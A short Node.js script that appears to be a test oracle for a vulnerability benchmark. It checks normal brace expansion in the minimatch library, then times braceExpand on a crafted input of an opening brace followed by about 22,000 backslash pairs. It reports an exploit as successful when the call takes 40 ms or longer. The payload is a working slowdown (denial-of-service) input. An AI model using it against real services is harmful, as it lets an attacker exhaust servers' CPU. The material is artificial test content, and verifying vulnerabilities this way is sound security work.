const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  const benign = minimatch.braceExpand('x{y,z}w');
  if (!Array.isArray(benign) || benign.length !== 2 || benign[0] !== 'xyw' || benign[1] !== 'xzw') {
    throw new Error('benign_result_mismatch');
  }

  operation_completed = true;

  const n = 22000;
  const payload = '{' + '\\\\'.repeat(n);

  const t0 = process.hrtime.bigint();
  let threw = false;
  try {
    minimatch.braceExpand(payload);
  } catch (e) {
    threw = true;
  }
  const elapsedMs = Number((process.hrtime.bigint() - t0) / 1000000n);

  const thresholdMs = 40;
  exploit_succeeded = !threw && elapsedMs >= thresholdMs;
  evidence = 'elapsed_ms=' + elapsedMs + ';threshold_ms=' + thresholdMs + ';payload_len=' + payload.length + ';threw=' + threw;
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failure=' + (err && err.message ? err.message : String(err));
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));